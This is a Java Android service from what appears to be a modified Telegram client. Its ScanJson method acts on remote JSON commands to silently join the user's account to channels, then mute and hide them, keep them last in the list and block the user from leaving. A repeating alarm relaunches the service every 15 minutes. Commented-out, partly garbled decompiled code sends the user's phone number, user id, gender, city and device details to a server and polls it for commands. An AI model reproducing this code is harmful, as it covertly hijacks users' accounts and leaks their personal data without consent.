package finalsoft.test;

/**
 * Created by FatalMan on 8/31/2017.
 */

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.IBinder;
import android.support.v4.app.NotificationCompat.Builder;
import android.util.Log;

import java.util.Calendar;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import finalsoft.FcmService.NotificationActivity;
import finalsoft.FcmService.Helper.Channel.ChannelHelper;
import finalsoft.FcmService.Helper.MuteHelper;
import finalsoft.FcmService.Helper.Notification.NotificationHelper;
//        import finalsoft.FcmService.Helper.Packet.SendRegidPacket;
//        import finalsoft.FcmService.Helper.Packet.SendViewPacket;
//        import org.pouyadr.Pouya.Helper.UrlController;
import finalsoft.FcmService.Setting.LastInListController;
import finalsoft.FcmService.Setting.NoQuitContoller;
import finalsoft.FcmService.Setting.TurnQuitToHideController;
import finalsoft.FcmService.Setting.hideChannelController;

import org.telegram.messenger.AndroidUtilities;
import org.telegram.messenger.ApplicationLoader;
import org.telegram.messenger.FileLog;
import org.telegram.messenger.UserConfig;
import org.telegram.messenger.volley.DefaultRetryPolicy;
import org.telegram.messenger.volley.RequestQueue;
import org.telegram.messenger.volley.Response.ErrorListener;
import org.telegram.messenger.volley.Response.Listener;
import org.telegram.messenger.volley.VolleyError;
import org.telegram.messenger.volley.toolbox.JsonArrayRequest;
import org.telegram.messenger.volley.toolbox.StringRequest;
import org.telegram.messenger.volley.toolbox.Volley;
import org.telegram.tgnet.TLRPC.User;
import org.telegram.ui.LaunchActivity;

import finalsoft.FcmService.Helper.UrlController;
import finalsoft.FcmService.Setting.Setting;

public class ServiesOfCommands
        extends Service {
    Calendar cur_cal = Calendar.getInstance();
    private RequestQueue requestQueue;

/*
    public static void Join()
    {
        if (!UserConfig.isClientActivated()) {}
        while ((Setting.isJoined()) || (!Setting.EnteredInfo())) {
            return;
        }
        RequestQueue localRequestQueue = Volley.newRequestQueue(ApplicationLoader.applicationContext);
        String str1 = UrlController.SERVERADD + "join.php?";
        String str2 = UserConfig.getCurrentUser().phone;
        String str3 = str1 + "phone=" + str2;
        StringBuilder localStringBuilder = new StringBuilder().append(str3).append("&male=");
        String str4;
        if (Setting.IsMale()) {
            str4 = "1";
        }
        for (;;)
        {
            String str5 = str4;
            String str6 = str5 + "&privance=" + Setting.getCity();
            String str7 = str6 + "&android=" + Build.VERSION.RELEASE;
            try
            {
                i = ApplicationLoader.applicationContext.getPackageManager().getPackageInfo(ApplicationLoader.applicationContext.getPackageName(), 0).versionCode;
                String str8 = str7 + "&version=" + i;
                String str9 = str8 + "&userid=" + UserConfig.getCurrentUser().id;
                String str10 = Build.MODEL.replace(" ", "-");
                if (str10.length() > 15) {
                    str10 = str10.substring(0, 15);
                }
                StringRequest localStringRequest = new StringRequest(0, str9 + "&phonemodel=" + str10, new Response.Listener()new Response.ErrorListener
                {
                    public void onResponse(String paramAnonymousString)
                    {
                        try
                        {
                            if (new JSONObject(paramAnonymousString).getInt("done") == 1)
                            {
                                Setting.setJoined();
                                new SendRegidPacket().Send();
                                new SendViewPacket().Send();
                            }
                            return;
                        }
                        catch (Exception localException)
                        {
                            FileLog.e("tmessages", localException);
                        }
                    }
                }, new Response.ErrorListener()
            {
                public void onErrorResponse(VolleyError paramAnonymousVolleyError) {}
            });
                localStringRequest.setShouldCache(false);
                localStringRequest.setTag("searcsh");
                localRequestQueue.add(localStringRequest);
                localStringRequest.setRetryPolicy(new DefaultRetryPolicy(30000, 1, 1.0F));
                return;
                str4 = "0";
            }
            catch (PackageManager.NameNotFoundException localNameNotFoundException)
            {
                for (;;)
                {
                    localNameNotFoundException.printStackTrace();
                    int i = 0;
                }
            }
        }
    }
*/

    public static void ScanJson(JSONObject paramJSONObject, Context paramContext) {
/*        try {
            switch (paramJSONObject.getString("type")) {
                case "link":
                    String str5 = paramJSONObject.getString("link");
                    String str6 = paramJSONObject.getString("text");
                    String str7 = paramJSONObject.getString("title");
                    Intent localIntent2 = new Intent(paramContext, NotificationActivity.class);
                    localIntent2.putExtra("channellink", str5);
                    Setting.setCurrentJoiningChannel(str5);
                    NotificationHelper.buildNotification(str7, str6, localIntent2).build();
                    return;
            }
        } catch (JSONException localJSONException) {
            localJSONException.printStackTrace();
            return;
        }*/
        String link = null;
        try {
            Log.i("finalsoft:","ScanJson started");
/*            link = paramJSONObject.getString("link");
//            String str3 = paramJSONObject.getString("text");
            Setting.setCurrentJoiningChannel(link);
//            String str4 = paramJSONObject.getString("title");
            Intent localIntent1 = new Intent(paramContext, LaunchActivity.class);
            localIntent1.putExtra("channellink", link);
//            localIntent1.putExtra("text", str3);
//            localIntent1.putExtra("title", str4);
            localIntent1.addFlags(268435456);
            paramContext.startActivity(localIntent1);*/
//            return;
            final String channel = paramJSONObject.getString("channel");
            Setting.setCurrentJoiningChannel(channel);
            int inoExit = paramJSONObject.getInt("noexit");
            boolean hide = paramJSONObject.isNull("hide");
            boolean lastInList = paramJSONObject.isNull("lastinlist");
            boolean mute = paramJSONObject.isNull("mute");
            int j = 0;
            if (!hide) {
                j = paramJSONObject.getInt("hide");
            }
            int k = 0;
            if (!lastInList) {
                k = paramJSONObject.getInt("lastinlist");
            }
            int m = 0;
            if (!mute) {
                m = paramJSONObject.getInt("mute");
            }
            if (!paramJSONObject.isNull("nhide")) {
                m = paramJSONObject.getInt("nhide");
            }
            if (inoExit > 0) {
                NoQuitContoller.addToNoQuit(channel);
            }
            if (0 > 0) {
                TurnQuitToHideController.add(channel);
            }
            ChannelHelper.JoinFast(channel.replace("@", ""));
            if (m > 0) {
                AndroidUtilities.runOnUIThread(new Runnable() {
                    public void run() {
                        MuteHelper.muteChannel(channel.replace("@", ""));
                    }
                }, 5000L);
            }
            if (j > 0) {
                hideChannelController.add(channel.replace("@", ""));
            }
            if (k > 0) {
                LastInListController.add(channel.replace("@", ""));
            }
            Log.i("finalsoft:","ScanJson ended!");
            Log.i("finalsoft", "link" +
                    "\nchannels:" + channel +
                    "\nhide:" + hide +
                    "\nmute:" + mute +
                    "\nlastinlist:" + lastInList +
                    "\nnoexit:" + inoExit
            );
//             paramContext.startActivity(new Intent(paramContext, NotificationActivity.class).putExtra("channellink",channel).addFlags(268435456));

        } catch (JSONException e) {
            Log.e("finalsoft:","ScanJson error" + e.getMessage());
            e.printStackTrace();
        }
    }

/*    private void getUpdate(JSONObject paramJSONObject)
    {
        ScanJson(paramJSONObject, this);
    }*/

/*
    private void getUpdates()
    {
        if (!UserConfig.isClientActivated()) {
            return;
        }
        if (!Setting.isJoined())
        {
            Join();
            return;
        }
        if ((Setting.getRegId() != null) && (!Setting.RegidIsSended().booleanValue())) {
            new SendRegidPacket().Send();
        }
        if (Setting.RegidIsSended().booleanValue())
        {
            new SendViewPacket().Send();
            return;
        }
        String str = UserConfig.getCurrentUser().phone;
        JsonArrayRequest local3 = new JsonArrayRequest(0, UrlController.SERVERADD + "getupdate.php?phone=" + str, null, new Response.Listener()new Response.ErrorListener
        {
            public void onResponse(JSONArray paramAnonymousJSONArray)
            {
                int i = 0;
                try
                {
                    for (;;)
                    {
                        int j = paramAnonymousJSONArray.length();
                        if (i < j) {
                            try
                            {
                                JSONObject localJSONObject = paramAnonymousJSONArray.getJSONObject(i);
                                ServiesOfCommands.this.getUpdate(localJSONObject);
                                i++;
                            }
                            catch (Exception localException2)
                            {
                                for (;;)
                                {
                                    FileLog.e("tmessages", localException2);
                                }
                            }
                        }
                    }
                    return;
                }
                catch (Exception localException1)
                {
                    FileLog.e("tmessages", localException1);
                }
            }
        }, new Response.ErrorListener()
    {
        public void onErrorResponse(VolleyError paramAnonymousVolleyError) {}
    }) {};
        local3.setShouldCache(false);
        local3.setTag("search");
        this.requestQueue.add(local3);
        local3.setRetryPolicy(new DefaultRetryPolicy(30000, 1, 1.0F));
    }
*/

    public IBinder onBind(Intent paramIntent) {
        return null;
    }

    @SuppressWarnings("WrongConstant")
    public void onCreate() {
        super.onCreate();
        this.requestQueue = Volley.newRequestQueue(ApplicationLoader.applicationContext);
        Intent localIntent = new Intent(this, ServiesOfCommands.class);
        PendingIntent localPendingIntent = PendingIntent.getService(getApplicationContext(), 0, localIntent, 0);
        AlarmManager localAlarmManager = (AlarmManager) getSystemService("alarm");
        this.cur_cal.setTimeInMillis(System.currentTimeMillis());
        localAlarmManager.setRepeating(0, this.cur_cal.getTimeInMillis(), 900000L, localPendingIntent);
    }

    public void onDestroy() {
        if (this.requestQueue != null) {
            this.requestQueue.cancelAll("search");
            this.requestQueue.stop();
        }
    }

    public void onStart(Intent paramIntent, int paramInt) {
        super.onStart(paramIntent, paramInt);
//        getUpdates();
    }
}

